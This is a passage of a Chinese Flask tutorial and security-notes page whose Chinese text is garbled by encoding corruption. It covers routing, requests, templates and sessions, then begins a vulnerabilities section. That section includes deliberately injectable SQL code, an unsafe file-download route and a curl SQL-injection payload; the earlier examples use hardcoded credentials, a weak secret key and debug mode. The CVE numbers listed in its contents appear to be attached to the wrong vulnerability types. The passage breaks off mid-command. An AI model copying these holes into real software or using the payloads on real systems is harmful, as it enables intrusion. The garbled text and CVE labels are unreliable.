class="hljs-type">True</span>, <span class="hljs-title">nullable</span>=<span class="hljs-type">False</span>)</span><br></code></pre></td></tr></table></figure><p><strong>åœ¨ <code>app.py</code> ä¸­åˆå§‹åŒ–æ•°æ®åº“ï¼š</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">pythonå¤åˆ¶ä»£ç <span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> models.<span class="hljs-keyword">user</span> <span class="hljs-keyword">import</span> db<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = <span class="hljs-string">&#x27;sqlite:///app.db&#x27;</span><br><br>db.init_app(app)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-keyword">debug</span>=<span class="hljs-keyword">True</span>)<br></code></pre></td></tr></table></figure><hr><h2 id="æ€»ç»“-2"><a href="#æ€»ç»“-2" class="headerlink" title="æ€»ç»“"></a><strong>æ€»ç»“</strong></h2><ol><li><strong>ç®€å•é¡¹ç›®</strong>ï¼šé€‚åˆå¿«é€Ÿå®éªŒå’Œå°å‹åº”ç”¨ã€‚</li><li><strong>åŸºäºè“å›¾çš„é¡¹ç›®</strong>ï¼šé€šè¿‡æ¨¡å—åŒ–æé«˜ä»£ç çš„å¯ç»´æŠ¤æ€§ã€‚</li><li><strong>RESTful API é¡¹ç›®</strong>ï¼šç”¨äºå‰åç«¯åˆ†ç¦»ï¼Œå¸¸è§äºç°ä»£ Web é¡¹ç›®ã€‚</li><li><strong>å¤§å‹ Flask é¡¹ç›®</strong>ï¼šåŒ…å«è®¤è¯ã€æ•°æ®åº“ã€æ¨¡æ¿ç­‰å®Œæ•´çš„åŠŸèƒ½ã€‚</li><li><strong>Flask + SQLAlchemy</strong>ï¼šç”¨äºå¤„ç†å¤æ‚çš„æ•°æ®æ¨¡å‹å’Œæ•°æ®åº“äº¤äº’ã€‚</li></ol><h3 id="è·¯ç”±æœºåˆ¶"><a href="#è·¯ç”±æœºåˆ¶" class="headerlink" title="è·¯ç”±æœºåˆ¶"></a>è·¯ç”±æœºåˆ¶</h3><p>Flask è·¯ç”±æœºåˆ¶é€šè¿‡ <code>@app.route()</code> è£…é¥°å™¨æ¥å°† URL æ˜ å°„åˆ°å¯¹åº”çš„å‡½æ•°ã€‚è¿™æ„å‘³ç€ï¼Œç”¨æˆ·è®¿é—®æŸä¸ª URL æ—¶ï¼ŒFlask ä¼šè‡ªåŠ¨è°ƒç”¨å¯¹åº”çš„è§†å›¾å‡½æ•°ï¼Œå¹¶è¿”å›ç»“æœç»™ç”¨æˆ·ã€‚</p><p><strong>ä»£ç ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, Flask!&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p><strong>è§£é‡Š</strong>ï¼š</p><ul><li><code>@app.route(&#39;/&#39;)</code> æ˜¯è·¯ç”±è£…é¥°å™¨ï¼Œç»‘å®š URL <code>/</code> åˆ° <code>index</code> å‡½æ•°ã€‚å½“ç”¨æˆ·è®¿é—®æ ¹è·¯å¾„ <code>/</code> æ—¶ï¼Œå°†è°ƒç”¨ <code>index</code> å‡½æ•°ï¼Œè¿”å› <code>&quot;Hello, Flask!&quot;</code>ã€‚</li><li><code>app.run(debug=True)</code> å¯åŠ¨æœåŠ¡å™¨å¹¶å¯ç”¨è°ƒè¯•æ¨¡å¼ï¼Œæ–¹ä¾¿å¼€å‘æ—¶æŸ¥çœ‹é”™è¯¯ä¿¡æ¯ã€‚</li></ul><hr><h3 id="è¯·æ±‚ä¸å“åº”"><a href="#è¯·æ±‚ä¸å“åº”" class="headerlink" title="è¯·æ±‚ä¸å“åº”"></a>è¯·æ±‚ä¸å“åº”</h3><p>Flask é€šè¿‡ <code>request</code> å¯¹è±¡æ¥å¤„ç† HTTP è¯·æ±‚æ•°æ®ï¼Œé€šè¿‡ <code>response</code> å¯¹è±¡æ¥è¿”å›å“åº”ç»“æœã€‚</p><p><strong>ä»£ç ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    username = request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>    <br>    <span class="hljs-keyword">if</span> username == <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">and</span> password == <span class="hljs-string">&quot;password&quot;</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Logged in successfully!&quot;</span>&#125;)<br>    <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;failure&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Login failed.&quot;</span>&#125;)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p><strong>è§£é‡Š</strong>ï¼š</p><ul><li><code>request.form.get(&#39;username&#39;)</code> ç”¨æ¥è·å– POST è¯·æ±‚ä¸­çš„è¡¨å•æ•°æ®ã€‚</li><li>æ ¹æ®ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œç®€å•çš„èº«ä»½éªŒè¯ï¼Œå¹¶è¿”å› JSON å“åº”ï¼Œé€šè¿‡ <code>jsonify()</code> å‡½æ•°å°† Python æ•°æ®ç»“æ„è½¬æ¢ä¸º JSON æ ¼å¼ã€‚</li></ul><hr><h3 id="æ¨¡æ¿æ¸²æŸ“"><a href="#æ¨¡æ¿æ¸²æŸ“" class="headerlink" title="æ¨¡æ¿æ¸²æŸ“"></a>æ¨¡æ¿æ¸²æŸ“</h3><p>Flask ä½¿ç”¨ Jinja2 æ¨¡æ¿å¼•æ“æ¥æ¸²æŸ“ HTML æ¨¡æ¿ï¼Œè¿™æ ·å¯ä»¥å°†åŠ¨æ€æ•°æ®ä¼ é€’åˆ°å‰ç«¯é¡µé¢ã€‚</p><p><strong>ä»£ç ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user/&lt;name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">user</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;user.html&#x27;</span>, name=name)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p><strong>è§£é‡Š</strong>ï¼š</p><ul><li><code>render_template(&#39;user.html&#39;, name=name)</code> åŠ è½½å¹¶æ¸²æŸ“ <code>user.html</code> æ¨¡æ¿ï¼Œå¹¶å°†å˜é‡ <code>name</code> ä¼ é€’ç»™æ¨¡æ¿ã€‚</li><li><code>&lt;name&gt;</code> æ˜¯ URL å‚æ•°ï¼Œè®¿é—® <code>/user/Alice</code> æ—¶ï¼Œ<code>Alice</code> ä¼šè¢«ä¼ é€’ç»™è§†å›¾å‡½æ•°ï¼Œæ¸²æŸ“åˆ°æ¨¡æ¿ä¸­ã€‚</li></ul><p>**æ¨¡æ¿æ–‡ä»¶ <code>user.html</code>**ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Flask Template<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, &#123;&#123; name &#125;&#125;!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å½“è®¿é—® <code>/user/Alice</code> æ—¶ï¼Œé¡µé¢å°†æ˜¾ç¤º <code>Hello, Alice!</code>ã€‚</p><hr><h3 id="ä¼šè¯ä¸-Cookie-ç®¡ç†"><a href="#ä¼šè¯ä¸-Cookie-ç®¡ç†" class="headerlink" title="ä¼šè¯ä¸ Cookie ç®¡ç†"></a>ä¼šè¯ä¸ Cookie ç®¡ç†</h3><p>Flask å¯ä»¥ä½¿ç”¨ä¼šè¯æ¥å­˜å‚¨ç”¨æˆ·çš„ä¸´æ—¶æ•°æ®ï¼Œä¼šè¯æ•°æ®å­˜å‚¨åœ¨å®¢æˆ·ç«¯ Cookie ä¸­ï¼Œå¹¶é€šè¿‡ Flask çš„ <code>secret_key</code> ç­¾åä»¥ç¡®ä¿å®‰å…¨ã€‚</p><p><strong>ä»£ç ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&#x27;super_secret_key&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/set_session/&lt;username&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_session</span>(<span class="hljs-params">username</span>):<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Session set for <span class="hljs-subst">&#123;username&#125;</span>&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/get_session&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_session</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Logged in as <span class="hljs-subst">&#123;session[<span class="hljs-string">&#x27;username&#x27;</span>]&#125;</span>&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No session set.&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p><strong>è§£é‡Š</strong>ï¼š</p><ul><li><code>session[&#39;username&#39;]</code> ç”¨æ¥è®¾ç½®ä¼šè¯å˜é‡ï¼Œå¹¶é€šè¿‡ Cookie ä¿å­˜ã€‚</li><li><code>app.secret_key</code> æ˜¯ç”¨æ¥ç­¾åä¼šè¯æ•°æ®çš„å¯†é’¥ï¼Œç¡®ä¿æ•°æ®æ²¡æœ‰è¢«ç¯¡æ”¹ã€‚</li></ul><hr><ul><li><p>å¥½çš„ï¼ä»¥ä¸‹æ˜¯å¸¦æœ‰è¯¦ç»†ç›®å½•çš„å®Œæ•´ç¬”è®°ï¼Œç»“åˆäº†ä¹‹å‰çš„å†…å®¹ï¼Œå¹¶æ ¹æ® Flask ä¸­çš„å¸¸è§æ¼æ´ï¼ˆå¦‚ SQL æ³¨å…¥ã€è¿œç¨‹ä»£ç æ‰§è¡Œã€ååºåˆ—åŒ–æ¼æ´ã€æ–‡ä»¶ä¸Šä¼ è·¯å¾„éå†ï¼‰è¿›è¡Œè¯¦ç»†çš„è§£é‡Šã€åˆ©ç”¨æ–¹å¼ã€æ½œåœ¨çš„å±å®³å’Œé˜²å¾¡æªæ–½ã€‚</p><hr><h1 id="Flask-å®‰å…¨æ¼æ´è¯¦è§£ä¸é˜²å¾¡æªæ–½"><a href="#Flask-å®‰å…¨æ¼æ´è¯¦è§£ä¸é˜²å¾¡æªæ–½" class="headerlink" title="Flask å®‰å…¨æ¼æ´è¯¦è§£ä¸é˜²å¾¡æªæ–½"></a>Flask å®‰å…¨æ¼æ´è¯¦è§£ä¸é˜²å¾¡æªæ–½</h1><h2 id="ç›®å½•-7"><a href="#ç›®å½•-7" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h2><ul><li><a href="#flask-%E6%A1%86%E6%9E%B6%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5">Flask æ¡†æ¶æ¶æ„ä¸åŸºç¡€æ¦‚å¿µ</a><ul><li><a href="#%E8%B7%AF%E7%94%B1%E6%9C%BA%E5%88%B6">è·¯ç”±æœºåˆ¶</a></li><li><a href="#%E8%AF%B7%E6%B1%82%E4%B8%8E%E5%93%8D%E5%BA%94">è¯·æ±‚ä¸å“åº”</a></li><li><a href="#%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93">æ¨¡æ¿æ¸²æŸ“</a></li><li><a href="#%E4%BC%9A%E8%AF%9D%E4%B8%8E-cookie-%E7%AE%A1%E7%90%86">ä¼šè¯ä¸ Cookie ç®¡ç†</a></li></ul></li><li><a href="#flask-%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E">Flask å¸¸è§çš„å®‰å…¨æ¼æ´</a><ul><li><a href="#sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">SQL æ³¨å…¥æ¼æ´</a></li><li><a href="#%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E">è·¯å¾„éå†æ¼æ´</a></li><li><a href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Crce">è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ (RCE)</a></li><li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">ååºåˆ—åŒ–æ¼æ´</a></li></ul></li><li><a href="#flask-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95">Flask æ¼æ´åˆ©ç”¨æ–¹æ³•</a><ul><li><a href="#sql-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">SQL æ³¨å…¥æ”»å‡»</a></li><li><a href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB">è¿œç¨‹ä»£ç æ‰§è¡Œæ”»å‡»</a></li><li><a href="#%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%94%BB%E5%87%BB">è·¯å¾„éå†æ”»å‡»</a></li><li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB">ååºåˆ—åŒ–æ”»å‡»</a></li></ul></li><li><a href="#flask-%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD">Flask å®‰å…¨é˜²å¾¡æªæ–½</a><ul><li><a href="#%E4%BD%BF%E7%94%A8-sqlalchemy-%E9%98%B2%E6%AD%A2-sql-%E6%B3%A8%E5%85%A5">ä½¿ç”¨ SQLAlchemy é˜²æ­¢ SQL æ³¨å…¥</a></li><li><a href="#%E8%B7%AF%E5%BE%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%8E%A7%E5%88%B6">è·¯å¾„å®‰å…¨æ€§æ§åˆ¶</a></li><li><a href="#%E7%A6%81%E7%94%A8%E6%A8%A1%E6%9D%BF%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">ç¦ç”¨æ¨¡æ¿ä»£ç æ‰§è¡Œ</a></li><li><a href="#%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE-cookie">å®‰å…¨é…ç½® Cookie</a></li></ul></li><li><a href="#%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">æ¼æ´æ€»ç»“</a><ul><li><a href="#cve-2019-1010083---sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">CVE-2019-1010083 - SQL æ³¨å…¥æ¼æ´</a></li><li><a href="#cve-2019-1010084---%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">CVE-2019-1010084 - è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</a></li><li><a href="#cve-2018-1000656---%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">CVE-2018-1000656 - ååºåˆ—åŒ–æ¼æ´</a></li><li><a href="#cve-2019-1010085---%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E">CVE-2019-1010085 - æ–‡ä»¶ä¸Šä¼ è·¯å¾„éå†æ¼æ´</a></li></ul></li></ul><hr><h2 id="Flask-æ¡†æ¶æ¶æ„ä¸åŸºç¡€æ¦‚å¿µ-1"><a href="#Flask-æ¡†æ¶æ¶æ„ä¸åŸºç¡€æ¦‚å¿µ-1" class="headerlink" title="Flask æ¡†æ¶æ¶æ„ä¸åŸºç¡€æ¦‚å¿µ"></a>Flask æ¡†æ¶æ¶æ„ä¸åŸºç¡€æ¦‚å¿µ</h2><h3 id="è·¯ç”±æœºåˆ¶-1"><a href="#è·¯ç”±æœºåˆ¶-1" class="headerlink" title="è·¯ç”±æœºåˆ¶"></a>è·¯ç”±æœºåˆ¶</h3><p>Flask ä½¿ç”¨è·¯ç”±è£…é¥°å™¨ <code>@app.route()</code> å°† URL è·¯å¾„æ˜ å°„åˆ°è§†å›¾å‡½æ•°ã€‚ç”¨æˆ·è®¿é—®ç‰¹å®š URL æ—¶ï¼ŒFlask è°ƒç”¨ç›¸åº”å‡½æ•°å¹¶è¿”å›ç»“æœã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, Flask!&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><h3 id="è¯·æ±‚ä¸å“åº”-1"><a href="#è¯·æ±‚ä¸å“åº”-1" class="headerlink" title="è¯·æ±‚ä¸å“åº”"></a>è¯·æ±‚ä¸å“åº”</h3><p>Flask ä½¿ç”¨ <code>request</code> å¯¹è±¡å¤„ç† HTTP è¯·æ±‚ï¼Œé€šè¿‡ <code>response</code> å¯¹è±¡è¿”å›ç»“æœã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request, jsonify<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>    <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;username&#x27;</span>: username, <span class="hljs-string">&#x27;password&#x27;</span>: password&#125;)<br></code></pre></td></tr></table></figure><h3 id="æ¨¡æ¿æ¸²æŸ“-1"><a href="#æ¨¡æ¿æ¸²æŸ“-1" class="headerlink" title="æ¨¡æ¿æ¸²æŸ“"></a>æ¨¡æ¿æ¸²æŸ“</h3><p>Flask é€šè¿‡ Jinja2 æ¨¡æ¿å¼•æ“æ¸²æŸ“åŠ¨æ€ HTML é¡µé¢ï¼Œå¹¶å…è®¸ä¼ é€’æ•°æ®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user/&lt;name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">user</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;user.html&#x27;</span>, name=name)<br></code></pre></td></tr></table></figure><h3 id="ä¼šè¯ä¸-Cookie-ç®¡ç†-1"><a href="#ä¼šè¯ä¸-Cookie-ç®¡ç†-1" class="headerlink" title="ä¼šè¯ä¸ Cookie ç®¡ç†"></a>ä¼šè¯ä¸ Cookie ç®¡ç†</h3><p>Flask ä¼šè¯ä½¿ç”¨ Cookie å­˜å‚¨ä¸´æ—¶æ•°æ®ï¼Œå¹¶é€šè¿‡ <code>secret_key</code> å¯¹æ•°æ®ç­¾åã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">app.secret_key = <span class="hljs-string">&#x27;super_secret_key&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/set_session/&lt;username&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_session</span>(<span class="hljs-params">username</span>):<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Session set for <span class="hljs-subst">&#123;username&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure><hr><h2 id="Flask-å¸¸è§çš„å®‰å…¨æ¼æ´"><a href="#Flask-å¸¸è§çš„å®‰å…¨æ¼æ´" class="headerlink" title="Flask å¸¸è§çš„å®‰å…¨æ¼æ´"></a>Flask å¸¸è§çš„å®‰å…¨æ¼æ´</h2><h3 id="SQL-æ³¨å…¥æ¼æ´"><a href="#SQL-æ³¨å…¥æ¼æ´" class="headerlink" title="SQL æ³¨å…¥æ¼æ´"></a>SQL æ³¨å…¥æ¼æ´</h3><p>SQL æ³¨å…¥æ¼æ´æ˜¯ç”±äºåº”ç”¨ç¨‹åºç›´æ¥å°†ç”¨æˆ·è¾“å…¥çš„æ•°æ®åµŒå…¥ SQL æŸ¥è¯¢ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„ SQL è¯­å¥ç»•è¿‡èº«ä»½éªŒè¯ã€è¯»å–æˆ–ä¿®æ”¹æ•°æ®åº“ä¸­çš„æ•æ„Ÿä¿¡æ¯ã€‚</p><p><strong>æ˜“å—æ”»å‡»ä»£ç ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user</span>():<br>    username = request.args.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    query = <span class="hljs-string">f&quot;SELECT * FROM users WHERE username = &#x27;<span class="hljs-subst">&#123;username&#125;</span>&#x27;&quot;</span><br>    conn = sqlite3.connect(<span class="hljs-string">&#x27;example.db&#x27;</span>)<br>    result = conn.execute(query)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(result.fetchall())<br></code></pre></td></tr></table></figure><p><strong>æ”»å‡»æ–¹å¼</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/user?username=&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span><br></code></pre></td></tr></table></figure><hr><h3 id="è·¯å¾„éå†æ¼æ´"><a href="#è·¯å¾„éå†æ¼æ´" class="headerlink" title="è·¯å¾„éå†æ¼æ´"></a>è·¯å¾„éå†æ¼æ´</h3><p>è·¯å¾„éå†æ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ–‡ä»¶è·¯å¾„ï¼Œè®¿é—®æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚</p><p><strong>æ˜“å—æ”»å‡»ä»£ç ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file/&lt;path:filename&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> send_from_directory(<span class="hljs-string">&#x27;/uploads&#x27;</span>, filename)<br></code></pre></td></tr></table></figure><p><strong>æ”»å‡»æ–¹å¼</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span 